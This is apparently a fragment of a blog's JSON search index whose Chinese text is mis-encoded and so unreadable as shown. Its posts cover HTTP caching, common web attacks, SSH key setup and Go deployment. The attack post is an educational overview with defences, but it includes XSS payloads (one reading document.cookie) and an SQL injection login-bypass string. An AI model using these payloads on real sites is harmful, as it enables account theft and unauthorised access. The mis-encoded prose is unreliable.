å¦‚æœå“åº”å¤´é‡Œå«æœ‰è¿™ä¸ªä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥åœ¨åç»­çš„è¯·æ±‚ä¸­å¸¦ä¸Š [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) æ¥éªŒè¯ç¼“å­˜ã€‚\n\n\n\n### 2.2 keep-alive\n\nHttp 1.1 ç‰ˆçš„æœ€å¤§å˜åŒ–ï¼Œå°±æ˜¯å¼•å…¥äº†æŒä¹…è¿æ¥ï¼ˆpersistent connectionï¼‰ï¼Œå³TCPè¿æ¥é»˜è®¤ä¸å…³é—­ï¼Œå¯ä»¥è¢«å¤šä¸ªè¯·æ±‚å¤ç”¨ï¼Œä¸ç”¨æ˜ç¡®å£°æ˜`Connection: keep-alive`ã€‚\n\n\n\n### 2.3 pipelining\n\nHttp 1.1 ç‰ˆè¿˜å¼•å…¥äº†ç®¡é“æœºåˆ¶ï¼ˆpipeliningï¼‰ï¼Œå³åœ¨åŒä¸€ä¸ªTCPè¿æ¥é‡Œé¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚ã€‚è¿™æ ·å°±è¿›ä¸€æ­¥æ”¹è¿›äº†HTTPåè®®çš„æ•ˆç‡ã€‚\n\nä¸¾ä¾‹æ¥è¯´ï¼Œå®¢æˆ·ç«¯éœ€è¦è¯·æ±‚ä¸¤ä¸ªèµ„æºã€‚ä»¥å‰çš„åšæ³•æ˜¯ï¼Œåœ¨åŒä¸€ä¸ªTCPè¿æ¥é‡Œé¢ï¼Œå…ˆå‘é€Aè¯·æ±‚ï¼Œç„¶åç­‰å¾…æœåŠ¡å™¨åšå‡ºå›åº”ï¼Œæ”¶åˆ°åå†å‘å‡ºBè¯·æ±‚ã€‚ç®¡é“æœºåˆ¶åˆ™æ˜¯å…è®¸æµè§ˆå™¨åŒæ—¶å‘å‡ºAè¯·æ±‚å’ŒBè¯·æ±‚ï¼Œä½†æ˜¯æœåŠ¡å™¨è¿˜æ˜¯æŒ‰ç…§é¡ºåºï¼Œå…ˆå›åº”Aè¯·æ±‚ï¼Œå®Œæˆåå†å›åº”Bè¯·æ±‚ã€‚\n\næ³¨æ„ï¼šè¿™ä¸ªpipeliningä»…ä»…æ˜¯é™äºç†è®ºåœºæ™¯ä¸‹ï¼Œå¤§éƒ¨åˆ†æ¡Œé¢æµè§ˆå™¨ä»ç„¶ä¼šé€‰æ‹©é»˜è®¤å…³é—­HTTP pipeliningï¼\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\n+ https://www.ruanyifeng.com/blog/2016/08/http.html\n+ https://zhuanlan.zhihu.com/p/58668946","tags":["http"],"categories":["http"]},{"title":"å¸¸è§webå®‰å…¨æ”»å‡»ä»‹ç»","url":"%2Fp%2F37ebc6b1.html","content":"\n# 1. XSS (**è·¨ç«™è„šæœ¬æ”»å‡»**,è½åœ¨è„šæœ¬)\n\nXSSï¼Œå³ Cross Site Scriptï¼Œä¸­è¯‘æ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ï¼›å…¶åŸæœ¬ç¼©å†™æ˜¯ CSSï¼Œä½†ä¸ºäº†å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheet)æœ‰æ‰€åŒºåˆ†ï¼Œå› è€Œåœ¨å®‰å…¨é¢†åŸŸå«åš XSSã€‚\n\n```javascript\n<script>alert('xssæ”»å‡»å¼€å§‹')</script>\n<script>alert('1')</script>\n<script>alert('2')</script>\n<script>alert('3\"')</script>\n```\n\n<!-- more -->\n\nXSS æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åœ¨ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„çš„å®¢æˆ·ç«¯ä»£ç ï¼Œé€šè¿‡æ¶æ„è„šæœ¬å¯¹å®¢æˆ·ç«¯ç½‘é¡µè¿›è¡Œç¯¡æ”¹ï¼Œä»è€Œåœ¨ç”¨æˆ·æµè§ˆç½‘é¡µæ—¶ï¼Œå¯¹ç”¨æˆ·æµè§ˆå™¨è¿›è¡Œæ§åˆ¶æˆ–è€…è·å–ç”¨æˆ·éšç§æ•°æ®çš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚\n\n\n\n### 1.1 ä¸¾ä¾‹\n\n+ åœ¨ç½‘é¡µ input æˆ–è€… textarea ä¸­è¾“å…¥` <script>alert('xss')</script>`æˆ–è€…å…¶ä»–è„šæœ¬\n+ ç›´æ¥ä½¿ç”¨ URL å‚æ•°æ”»å‡»` https://www.baidu.com?jarttoTest=<script>alert(document.cookie)</script>`\n\n\n\n### 1.2 é˜²èŒƒ\n\n+ HttpOnly é˜²æ­¢åŠ«å– Cookie\n\n+ ç”¨æˆ·è¾“å…¥æ£€æŸ¥\n\n  ä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„ä»»ä½•è¾“å…¥ã€‚  å¯¹äºç”¨æˆ·çš„ä»»ä½•è¾“å…¥è¦è¿›è¡Œæ£€æŸ¥ã€è¿‡æ»¤å’Œè½¬ä¹‰ã€‚å»ºç«‹å¯ä¿¡ä»»çš„å­—ç¬¦å’Œ HTML æ ‡ç­¾ç™½åå•ï¼Œå¯¹äºä¸åœ¨ç™½åå•ä¹‹åˆ—çš„å­—ç¬¦æˆ–è€…æ ‡ç­¾è¿›è¡Œè¿‡æ»¤æˆ–ç¼–ç ã€‚\n\n  åœ¨ XSS é˜²å¾¡ä¸­ï¼Œè¾“å…¥æ£€æŸ¥ä¸€èˆ¬æ˜¯æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¸­æ˜¯å¦åŒ…å« <ï¼Œ> ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤æˆ–ç¼–ç ï¼Œè¿™ç§æ–¹å¼ä¹Ÿç§°ä¸º XSS Filterã€‚\n\n+ æœåŠ¡å™¨è¾“å‡ºæ£€æŸ¥\n\n  ä¸€èˆ¬æ¥è¯´ï¼Œé™¤å¯Œæ–‡æœ¬çš„è¾“å‡ºå¤–ï¼Œåœ¨æœåŠ¡å™¨å˜é‡è¾“å‡ºåˆ° HTML é¡µé¢æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç æˆ–è½¬ä¹‰çš„æ–¹å¼æ¥é˜²å¾¡ XSS æ”»å‡»ã€‚ä¾‹å¦‚åˆ©ç”¨ sanitize-html å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œæœ‰è§„åˆ™çš„è¿‡æ»¤ä¹‹åå†è¾“å‡ºåˆ°é¡µé¢ä¸­ã€‚\n  \n  \n\n# 2. CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ ,è½åœ¨è¯·æ±‚)\n\nCSRFï¼Œå³ Cross Site Request Forgeryï¼Œä¸­è¯‘æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§åŠ«æŒå—ä¿¡ä»»ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€éé¢„æœŸè¯·æ±‚çš„æ”»å‡»æ–¹å¼ã€‚\n\né€šå¸¸æƒ…å†µä¸‹ï¼ŒCSRF æ”»å‡»æ˜¯æ”»å‡»è€…å€ŸåŠ©å—å®³è€…çš„ Cookie éª—å–æœåŠ¡å™¨çš„ä¿¡ä»»ï¼Œå¯ä»¥åœ¨å—å®³è€…æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…åä¹‰ä¼ªé€ è¯·æ±‚å‘é€ç»™å—æ”»å‡»æœåŠ¡å™¨ï¼Œä»è€Œåœ¨å¹¶æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œåœ¨æƒé™ä¿æŠ¤ä¹‹ä¸‹çš„æ“ä½œã€‚\n\n### 2.1 é˜²èŒƒ\n\n+ éªŒè¯ç \n\n  CSRF æ”»å‡»å¾€å¾€æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ„é€ äº†ç½‘ç»œè¯·æ±‚ã€‚è€ŒéªŒè¯ç ä¼šå¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸åº”ç”¨è¿›è¡Œäº¤äº’ï¼Œæ‰èƒ½å®Œæˆæœ€ç»ˆè¯·æ±‚ã€‚å› ä¸ºé€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç èƒ½å¤Ÿå¾ˆå¥½åœ°éåˆ¶ CSRF æ”»å‡»ã€‚\n\n+ Referer Check\n\n  æ ¹æ® HTTP åè®®ï¼Œåœ¨ HTTP å¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå« Refererï¼Œå®ƒè®°å½•äº†è¯¥ HTTP è¯·æ±‚çš„æ¥æºåœ°å€ã€‚é€šè¿‡ Referer Checkï¼Œå¯ä»¥æ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„\"æº\"ã€‚\n\n  Referer Check ä¸ä»…èƒ½é˜²èŒƒ CSRF æ”»å‡»ï¼Œå¦ä¸€ä¸ªåº”ç”¨åœºæ™¯æ˜¯ \"é˜²æ­¢å›¾ç‰‡ç›—é“¾\"ã€‚\n\n+ æ·»åŠ  token éªŒè¯\n\n  è¦æŠµå¾¡ CSRFï¼Œå…³é”®åœ¨äºåœ¨è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äº Cookie ä¹‹ä¸­ã€‚å¯ä»¥åœ¨ HTTP è¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ª tokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰ token æˆ–è€… token å†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯ CSRF æ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚\n\n  \n\n# 3. SQL æ³¨å…¥\n\nsqlæ³¨å…¥çš„åŸç†æ˜¯å°†sqlä»£ç ä¼ªè£…åˆ°è¾“å…¥å‚æ•°ä¸­ï¼Œä¼ é€’åˆ°æœåŠ¡å™¨è§£æå¹¶æ‰§è¡Œçš„ä¸€ç§æ”»å‡»æ‰‹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€äº›å¯¹serverç«¯å‘èµ·çš„è¯·æ±‚å‚æ•°ä¸­æ¤å…¥ä¸€äº›sqlä»£ç ï¼Œserverç«¯åœ¨æ‰§è¡Œsqlæ“ä½œæ—¶ï¼Œä¼šæ‹¼æ¥å¯¹åº”å‚æ•°ï¼ŒåŒæ—¶ä¹Ÿå°†ä¸€äº›sqlæ³¨å…¥æ”»å‡»çš„â€œsqlâ€æ‹¼æ¥èµ·æ¥ï¼Œå¯¼è‡´ä¼šæ‰§è¡Œä¸€äº›é¢„æœŸä¹‹å¤–çš„æ“ä½œã€‚\n\n### 3.1 ä¸¾ä¾‹\n\n```sql\nsql:=\"SELECT * FROM user WHERE username='\"+username+\"' AND password='\"+password+\"'\"\n```\n\nå¦‚æœç”¨æˆ·çš„è¾“å…¥çš„ç”¨æˆ·åå¦‚ä¸‹ï¼Œå¯†ç ä»»æ„\n\n```sql\nmyuser' or 'foo' = 'foo' --\n```\n\né‚£ä¹ˆæˆ‘ä»¬çš„SQLå˜æˆäº†å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```sql\nSELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx'\n```\n\nåœ¨SQLé‡Œé¢`--`æ˜¯æ³¨é‡Šæ ‡è®°ï¼Œæ‰€ä»¥æŸ¥è¯¢è¯­å¥ä¼šåœ¨æ­¤ä¸­æ–­ã€‚è¿™å°±è®©æ”»å‡»è€…åœ¨ä¸çŸ¥é“ä»»ä½•åˆæ³•ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹æˆåŠŸç™»å½•äº†ã€‚\n\n### 3.2 é˜²èŒƒ\n\n+ ä¸¥æ ¼é™åˆ¶Webåº”ç”¨çš„æ•°æ®åº“çš„æ“ä½œæƒé™ï¼Œç»™æ­¤ç”¨æˆ·æä¾›ä»…ä»…èƒ½å¤Ÿæ»¡è¶³å…¶å·¥ä½œçš„æœ€ä½æƒé™ï¼Œä»è€Œæœ€å¤§é™åº¦çš„å‡å°‘æ³¨å…¥æ”»å‡»å¯¹æ•°æ®åº“çš„å±å®³ã€‚\n\n+ æ£€æŸ¥è¾“å…¥çš„æ•°æ®æ˜¯å¦å…·æœ‰æ‰€æœŸæœ›çš„æ•°æ®æ ¼å¼ï¼Œä¸¥æ ¼é™åˆ¶å˜é‡çš„ç±»å‹ï¼Œä¾‹å¦‚ä½¿ç”¨regexpåŒ…è¿›è¡Œä¸€äº›åŒ¹é…å¤„ç†ï¼Œæˆ–è€…ä½¿ç”¨strconvåŒ…å¯¹å­—ç¬¦ä¸²è½¬åŒ–æˆå…¶ä»–åŸºæœ¬ç±»å‹çš„æ•°æ®è¿›è¡Œåˆ¤æ–­ã€‚\n\n+ å¯¹è¿›å…¥æ•°æ®åº“çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ'\"\\å°–æ‹¬å·&*;ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæˆ–ç¼–ç è½¬æ¢ã€‚Go çš„`text/template`åŒ…é‡Œé¢çš„`HTMLEscapeString`å‡½æ•°å¯ä»¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚\n\n+ æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥å»ºè®®ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ°SQLè¯­å¥ä¸­ï¼Œå³ä¸è¦ç›´æ¥æ‹¼æ¥SQLè¯­å¥ã€‚ä¾‹å¦‚ä½¿ç”¨`database/sql`é‡Œé¢çš„æŸ¥è¯¢å‡½æ•°`Prepare`å’Œ`Query`ï¼Œæˆ–è€…`Exec(query string, args ...interface{})`ã€‚\n\n+ åœ¨åº”ç”¨å‘å¸ƒä¹‹å‰å»ºè®®ä½¿ç”¨ä¸“ä¸šçš„SQLæ³¨å…¥æ£€æµ‹å·¥å…·è¿›è¡Œæ£€æµ‹ï¼Œä»¥åŠæ—¶ä¿®è¡¥è¢«å‘ç°çš„SQLæ³¨å…¥æ¼æ´ã€‚ç½‘ä¸Šæœ‰å¾ˆå¤šè¿™æ–¹é¢çš„å¼€æºå·¥å…·ï¼Œä¾‹å¦‚sqlmapã€SQLninjaç­‰ã€‚\n\n+ é¿å…ç½‘ç«™æ‰“å°å‡ºSQLé”™è¯¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç±»å‹é”™è¯¯ã€å­—æ®µä¸åŒ¹é…ç­‰ï¼ŒæŠŠä»£ç é‡Œçš„SQLè¯­å¥æš´éœ²å‡ºæ¥ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨è¿™äº›é”™è¯¯ä¿¡æ¯è¿›è¡ŒSQLæ³¨å…¥ã€‚\n\n\n\n# 4. DDos æ”»å‡»\n\n Distributed Denial of Serviceï¼Œç¿»è¯‘æˆä¸­æ–‡å°±æ˜¯åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ã€‚ä¸€èˆ¬æ¥è¯´æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨â€œè‚‰é¸¡â€å¯¹ç›®æ ‡ç½‘ç«™åœ¨è¾ƒçŸ­çš„æ—¶é—´å†…å‘èµ·å¤§é‡è¯·æ±‚ï¼Œå¤§è§„æ¨¡æ¶ˆè€—ç›®æ ‡ç½‘ç«™çš„ä¸»æœºèµ„æºï¼Œè®©å®ƒæ— æ³•æ­£å¸¸æœåŠ¡ã€‚åœ¨çº¿æ¸¸æˆã€äº’è”ç½‘é‡‘èç­‰é¢†åŸŸæ˜¯ DDoS æ”»å‡»çš„é«˜å‘è¡Œä¸šã€‚\n\n### 4.1 ä¸¾ä¾‹\n\n+ SYN Flood æ”»å‡»\n\n  SYN Flood å°±æ˜¯ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€æŠ¥æ–‡åçªç„¶æ­»æœºæˆ–æ‰çº¿ï¼Œé‚£ä¹ˆæœåŠ¡å™¨åœ¨å‘å‡ºåº”ç­”æŠ¥æ–‡åå°±æ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯çš„ç¡®è®¤æŠ¥æ–‡ï¼ˆç¬¬ä¸‰æ¬¡æ¡æ‰‹æ— æ³•å®Œæˆï¼‰ï¼Œè¿™æ—¶æœåŠ¡å™¨ç«¯ä¸€èˆ¬ä¼šé‡è¯•å¹¶ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼ˆè‡³å°‘ 30sï¼‰åå†ä¸¢å¼ƒè¿™ä¸ªæœªå®Œæˆçš„è¿æ¥ã€‚\n\n  ä¸€ä¸ªç”¨æˆ·å‡ºç°å¼‚å¸¸å¯¼è‡´æœåŠ¡å™¨çš„ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…ä¸€ä¼šå„¿å¹¶ä¸æ˜¯å¤§é—®é¢˜ï¼Œä½†æ¶æ„æ”»å‡»è€…å¤§é‡æ¨¡æ‹Ÿï¼ˆæ„é€ æº IP å»å‘é€ SYN åŒ…ï¼‰è¿™ç§æƒ…å†µï¼ŒæœåŠ¡å™¨ç«¯ä¸ºäº†ç»´æŠ¤æ•°ä»¥ä¸‡è®¡çš„åŠè¿æ¥è€Œæ¶ˆè€—éå¸¸å¤šçš„èµ„æºï¼Œç»“æœå¾€å¾€æ˜¯æ— æš‡ç†ç¬æ­£å¸¸å®¢æˆ·çš„è¯·æ±‚ï¼Œç”šè‡³å´©æºƒã€‚ä»æ­£å¸¸å®¢æˆ·çš„è§’åº¦çœ‹æ¥ï¼Œç½‘ç«™å¤±å»äº†å“åº”ï¼Œæ— æ³•è®¿é—®ã€‚\n\n+ CC æ”»å‡»\n\n  CC æ”»å‡»çš„åŸç†å°±æ˜¯å€ŸåŠ©ä»£ç†æœåŠ¡å™¨é’ˆå¯¹ç›®æ ‡ç³»ç»Ÿçš„æ¶ˆè€—èµ„æºæ¯”è¾ƒå¤§çš„é¡µé¢ä¸æ–­å‘èµ·æ­£å¸¸çš„è¯·æ±‚ï¼Œé€ æˆå¯¹æ–¹æœåŠ¡å™¨èµ„æºè€—å°½ï¼Œä¸€ç›´åˆ°å®•æœºå´©æºƒã€‚å› æ­¤åœ¨å‘é€ CC æ”»å‡»å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾åŠ è½½æ¯”è¾ƒæ…¢ï¼Œæ¶ˆè€—èµ„æºæ¯”è¾ƒå¤šçš„ç½‘é¡µã€‚æ¯”å¦‚ï¼šéœ€è¦æŸ¥è¯¢æ•°æ®åº“çš„é¡µé¢ã€è¯»å†™ç¡¬ç›˜çš„æ–‡ä»¶ç­‰ã€‚ç›¸æ¯”å…¶å®ƒçš„ DDoS æ”»å‡» CC æ›´æœ‰æŠ€æœ¯å«é‡ä¸€äº›ï¼Œè¿™ç§æ”»å‡»ä½ è§ä¸åˆ°çœŸå®æº IPã€‚è§ä¸åˆ°ç‰¹åˆ«å¤§çš„å¼‚å¸¸æµé‡ï¼Œä½†é€ æˆæœåŠ¡å™¨æ— æ³•è¿›è¡Œæ­£å¸¸è¿æ¥ã€‚\n\n### 4.2 é˜²èŒƒ\n\n**1ã€é‡‡ç”¨é«˜æ€§èƒ½çš„ç½‘ç»œè®¾å¤‡**\n\né¦–å…ˆéœ€è¦ä¿è¯è·¯ç”±å™¨ã€äº¤æ¢æœºã€ç¡¬ä»¶é˜²ç«å¢™ç­‰ç½‘ç»œè®¾å¤‡çš„æ€§èƒ½ï¼Œå½“å‘ç”ŸDDoSæ”»å‡»çš„æ—¶å€™ï¼Œç”¨è¶³å¤Ÿæ€§èƒ½çš„æœºå™¨ã€å®¹é‡å»æ‰¿å—æ”»å‡»ï¼Œå……åˆ†åˆ©ç”¨ç½‘ç»œè®¾å¤‡ä¿æŠ¤ç½‘ç»œèµ„æºæ˜¯ååˆ†æœ‰æ•ˆçš„åº”å¯¹ç­–ç•¥ã€‚\n\n**2ã€ä¿è¯æœåŠ¡å™¨ç³»ç»Ÿçš„å®‰å…¨**\n\né¦–å…ˆè¦ç¡®ä¿æœåŠ¡å™¨è½¯ä»¶æ²¡æœ‰ä»»ä½•æ¼æ´ï¼Œé˜²æ­¢æ”»å‡»è€…å…¥ä¾µã€‚ç¡®ä¿æœåŠ¡å™¨é‡‡ç”¨æœ€æ–°ç³»ç»Ÿï¼Œå¹¶æ‰“ä¸Šå®‰å…¨è¡¥ä¸ã€‚åœ¨æœåŠ¡å™¨ä¸Šåˆ é™¤æœªä½¿ç”¨çš„æœåŠ¡ï¼Œå…³é—­æœªä½¿ç”¨çš„ç«¯å£ã€‚å¯¹äºæœåŠ¡å™¨ä¸Šè¿è¡Œçš„ç½‘ç«™ï¼Œç¡®ä¿å…¶æ‰“äº†æœ€æ–°çš„è¡¥ä¸ï¼Œæ²¡æœ‰å®‰å…¨æ¼æ´ã€‚\n\n**3ã€å……è¶³çš„ç½‘ç»œå¸¦å®½ä¿è¯**\n\nç½‘ç»œå¸¦å®½ç›´æ¥å†³å®šäº†èƒ½æŠ—å—æ”»å‡»çš„èƒ½åŠ›ï¼Œå‡è‹¥ä»…ä»…æœ‰10Må¸¦å®½çš„è¯ï¼Œæ— è®ºé‡‡å–ä»€ä¹ˆæªæ–½éƒ½å¾ˆéš¾å¯¹æŠ—ç°åœ¨çš„SYNFloodæ”»å‡»ï¼Œå½“å‰è‡³å°‘è¦é€‰æ‹©100Mçš„å…±äº«å¸¦å®½ï¼Œæœ€å¥½çš„å½“ç„¶æ˜¯æŒ‚åœ¨1000Mçš„ä¸»å¹²ä¸Šäº†ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸»æœºä¸Šçš„ç½‘å¡æ˜¯1000Mçš„å¹¶ä¸æ„å‘³ç€å®ƒçš„ç½‘ç»œå¸¦å®½å°±æ˜¯åƒå…†çš„ï¼Œè‹¥æŠŠå®ƒæ¥åœ¨100Mçš„äº¤æ¢æœºä¸Šï¼Œå®ƒçš„å®é™…å¸¦å®½ä¸ä¼šè¶…è¿‡100Mï¼Œå†å°±æ˜¯æ¥åœ¨100Mçš„å¸¦å®½ä¸Šä¹Ÿä¸ç­‰äºå°±æœ‰äº†ç™¾å…†çš„å¸¦å®½ï¼Œå› ä¸ºç½‘ç»œæœåŠ¡å•†å¾ˆå¯èƒ½ä¼šåœ¨äº¤æ¢æœºä¸Šé™åˆ¶å®é™…å¸¦å®½ä¸º10Mï¼Œè¿™ç‚¹ä¸€å®šè¦ææ¸…æ¥šã€‚\n\n**4ã€æŠŠç½‘ç«™åšæˆé™æ€é¡µé¢æˆ–è€…ä¼ªé™æ€**\n\nå¤§é‡äº‹å®è¯æ˜ï¼ŒæŠŠç½‘ç«™å°½å¯èƒ½åšæˆé™æ€é¡µé¢ï¼Œä¸ä»…èƒ½å¤§å¤§æé«˜æŠ—æ”»å‡»èƒ½åŠ›ï¼Œè€Œä¸”è¿˜ç»™é»‘å®¢å…¥ä¾µå¸¦æ¥ä¸å°‘éº»çƒ¦ï¼Œè‡³å°‘åˆ°ç°åœ¨ä¸ºæ­¢å…³äºHTMLçš„æº¢å‡ºè¿˜æ²¡å‡ºç°ã€‚å¦‚æœééœ€è¦åŠ¨æ€è„šæœ¬è°ƒç”¨ï¼Œé‚£å°±æŠŠå®ƒå¼„åˆ°å¦å¤–ä¸€å°å•ç‹¬ä¸»æœºå»ï¼Œå…çš„é­å—æ”»å‡»æ—¶è¿ç´¯ä¸»æœåŠ¡å™¨ï¼Œå½“ç„¶ï¼Œé€‚å½“æ”¾ä¸€äº›ä¸åšæ•°æ®åº“è°ƒç”¨è„šæœ¬è¿˜æ˜¯å¯ä»¥çš„ã€‚\n\n**5ã€å¢å¼ºæ“ä½œç³»ç»Ÿçš„TCP/IPæ ˆ**\n\nWindowsæ“ä½œç³»ç»Ÿæœ¬èº«å°±å…·å¤‡ä¸€å®šçš„æŠµæŠ—DDoSæ”»å‡»çš„èƒ½åŠ›ï¼Œåªæ˜¯é»˜è®¤çŠ¶æ€ä¸‹æ²¡æœ‰å¼€å¯è€Œå·²ï¼Œè‹¥å¼€å¯çš„è¯å¯æŠµæŒ¡çº¦10000ä¸ªSYNæ”»å‡»åŒ…ï¼Œè‹¥æ²¡æœ‰å¼€å¯åˆ™ä»…èƒ½æŠµå¾¡æ•°ç™¾ä¸ªï¼Œå…·ä½“æ€ä¹ˆå¼€å¯ï¼Œè¿˜éœ€è‡ªè¡Œå»å¾®è½¯å®˜ç½‘äº†è§£ã€‚\n\n**6ã€HTTP è¯·æ±‚çš„æ‹¦æˆª**\n\nHTTP è¯·æ±‚çš„ç‰¹å¾ä¸€èˆ¬æœ‰ä¸¤ç§ï¼šIP åœ°å€å’Œ User Agent å­—æ®µã€‚æ¯”å¦‚ï¼Œæ¶æ„è¯·æ±‚éƒ½æ˜¯ä»æŸä¸ª IP æ®µå‘å‡ºçš„ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ª IP æ®µå°æ‰å°±è¡Œã€‚æˆ–è€…ï¼Œå®ƒä»¬çš„ User Agent å­—æ®µæœ‰ç‰¹å¾(åŒ…å«æŸä¸ªç‰¹å®šçš„è¯è¯­)ï¼Œé‚£å°±æŠŠå¸¦æœ‰è¿™ä¸ªè¯è¯­çš„è¯·æ±‚æ‹¦æˆªã€‚\n\n**7ã€éƒ¨ç½²CDN**\n\nCDN æŒ‡çš„æ˜¯ç½‘ç«™çš„é™æ€å†…å®¹åˆ†å‘åˆ°å¤šä¸ªæœåŠ¡å™¨ï¼Œç”¨æˆ·å°±è¿‘è®¿é—®ï¼Œæé«˜é€Ÿåº¦ã€‚å› æ­¤ï¼ŒCDN ä¹Ÿæ˜¯å¸¦å®½æ‰©å®¹çš„ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é˜²å¾¡ DDOS æ”»å‡»ã€‚\n\n**8ã€éšè—æœåŠ¡å™¨çš„çœŸå®IPåœ°å€**\n\næœåŠ¡å™¨å‰ç«¯åŠ CDNä¸­è½¬ï¼Œå¦‚æœèµ„é‡‘å……è£•çš„è¯ï¼Œå¯ä»¥è´­ä¹°é«˜é˜²çš„ç›¾æœºï¼Œç”¨äºéšè—æœåŠ¡å™¨çœŸå®IPï¼ŒåŸŸåè§£æä½¿ç”¨CDNçš„IPï¼Œæ‰€æœ‰è§£æçš„å­åŸŸåéƒ½ä½¿ç”¨CDNçš„IPåœ°å€ã€‚æ­¤å¤–ï¼ŒæœåŠ¡å™¨ä¸Šéƒ¨ç½²çš„å…¶ä»–åŸŸåä¹Ÿä¸èƒ½ä½¿ç”¨çœŸå®IPè§£æï¼Œå…¨éƒ¨éƒ½ä½¿ç”¨CDNæ¥è§£æã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://juejin.im/post/5cef3a3bf265da1b8d160052\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md\n+ https://www.hi-linux.com/posts/50873.html","tags":["å®‰å…¨"],"categories":["web"]},{"title":"ssh_scpå…å¯†å’ŒæœåŠ¡å™¨å»ºç«‹ä¿¡ä»»","url":"%2Fp%2Ffe0e5995.html","content":"\n+ åœ¨macä¸Šç”Ÿæˆå¯†é’¥\n\t\n\tç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶`vultr`  `vultr.pub`\n\t\n\t`ssh-keygen -t rsa`   //passphraseå¯ä»¥ä¸ºç©º\n\n+ å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨\n\n\tç¬¬ä¸€ç§æ–¹å¼: \n\t\n\t`scp ~/.ssh/vultr.pub root@207.246.80.69:/root/.ssh/authorized_keys`\n\t\n\tç¬¬äºŒç§æ–¹å¼:\n\t\n\t`ssh-copy-id -i ~/.ssh/vultr.pub root@207.246.80.69`\n\n<!-- more -->\n+ æ·»åŠ åˆ°vultrçš„ssh keyé‡Œ(è¿™ä¸€æ­¥å¯ä»¥ä¸åš)\n\n\t`https://my.vultr.com/sshkeys/`\n\n\t\n\n+ ä¸€é”®è¿æ¥åˆ°ssh\n\t\n\tå‘½ä»¤: `ssh -i ~/.ssh/vultr root@207.246.80.69`\n\n+ scp files\n\n\tå‘½ä»¤: `scp -i ~/.ssh/vultr files root@207.246.80.69:/root`\n","tags":["ssh"],"categories":["ç³»ç»Ÿ"]},{"title":"linuxéƒ¨ç½²golangçš„æ–¹å¼","url":"%2Fp%2F8956ebfb.html","content":"\n\n### é€šè¿‡sshæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨\n\n```\nscp -i /Users/liuwei/.ssh/aws.pem 